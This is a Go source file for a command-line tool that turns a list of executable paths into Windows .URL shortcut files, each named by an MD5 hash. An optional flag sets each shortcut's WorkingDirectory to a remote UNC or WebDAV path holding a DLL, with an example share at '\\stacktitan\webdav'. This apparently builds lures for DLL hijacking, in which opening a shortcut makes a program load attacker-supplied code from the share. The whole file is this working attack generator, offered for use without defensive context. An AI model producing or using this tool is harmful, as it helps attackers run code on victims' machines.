package main

import (
	"bufio"
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"

	"github.com/spf13/pflag"
)

var (
	flags = pflag.FlagSet{SortFlags: false}
	opts  OptArg
)

// OptArg is a struct of cli args
type OptArg struct {
	Infile  string
	OutDir  string
	DLLfile string
}

func init() {
	flags.StringVarP(&opts.Infile, "infile", "i", "", "Path: the file containing a list of exe absolute paths")
	flags.StringVarP(&opts.OutDir, "outdir", "o", "tmp", "Path: the output directory to store the generated .URL files (default ./tmp/")
	flags.StringVarP(&opts.DLLfile, "dll", "d", "", "Path: the UNC|Webdav/dll to include within the .URL file (optional)")
	flags.Usage = usage
	flags.Parse(os.Args[1:])

	if flags.NFlag() == 0 {
		flags.PrintDefaults()
		os.Exit(1)
	}
	if opts.Infile == "" {
		log.Fatal("Fatal: The --infile | -i flag is required")
	}
}

func usage() {
	fmt.Fprintf(os.Stderr, "Example Usage: %s --infile executable.txt\n", os.Args[0])
	fmt.Fprintf(os.Stderr, `Example Usage: %s --infile executable.txt --outdir samples --dll '\\stacktitan\webdav'`+"\n", os.Args[0])
	fmt.Fprintf(os.Stderr, "Note: the hash2filepath.txt is auto generated and contains a hash of the literal executable filepath and the hash itself\n\n")
	fmt.Fprintf(os.Stderr, "Flags: %s {OPTION]...\n", os.Args[0])
	flags.PrintDefaults()
	os.Exit(0)
}

func main() {
	processURL(&opts)
}

func processURL(oa *OptArg) {
	file, err := os.Open(oa.Infile)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	dir, err := filepath.Abs(oa.OutDir)
	if err != nil {
		log.Fatal(err)
	}

	result := createDirectory(dir)
	if result {
		fmt.Printf("Results will be written to %s\n", dir)
	} else {
		fmt.Println("There was an error creating the directory")
	}

	hashfile, err := os.Create(filepath.Join(dir, "hash2filepath.txt"))
	if err != nil {
		log.Fatal(err)
	}
	defer hashfile.Close()
	w := bufio.NewWriter(hashfile)

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		hash := createMD5(scanner.Text())
		urlEntry := createURL(oa, scanner.Text())
		writeURL(hash, string(urlEntry), dir)

		_, err := w.WriteString(hash + " : " + scanner.Text() + "\n")
		if err != nil {
			log.Fatal(err)
		}
		w.Flush()
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
}

func createMD5(s string) string {
	h := md5.New()
	io.WriteString(h, s)
	return hex.EncodeToString(h.Sum(nil))
}

func writeURL(hash, contents, dir string) {
	name := hash + ".URL"
	file, err := os.Create(filepath.Join(dir, name))
	if err != nil {
		log.Fatal(err)
	}
	fw := bufio.NewWriter(file)
	numbytes, err := fw.WriteString(contents)
	fmt.Printf("Wrote %d bytes to file: %s\n", numbytes, name)
	fw.Flush()
}

func createURL(oa *OptArg, s string) []byte {
	filecontents := []byte("[InternetShortcut]\n")
	urlheader := []byte("URL=" + s + "\n")
	wdheader := []byte("WorkingDirectory=\n")
	if oa.DLLfile != "" {
		wdheader = []byte("WorkingDirectory=" + oa.DLLfile + "\n")
	}

	filecontents = append(filecontents, urlheader...)
	filecontents = append(filecontents, wdheader...)
	return filecontents
}

func createDirectory(d string) bool {
	src, err := os.Stat(d)

	if os.IsNotExist(err) {
		errDir := os.MkdirAll(d, 0755)
		if errDir != nil {
			return false
		}
		return true
	}

	if src.Mode().IsRegular() {
		return false
	}
	return false
}
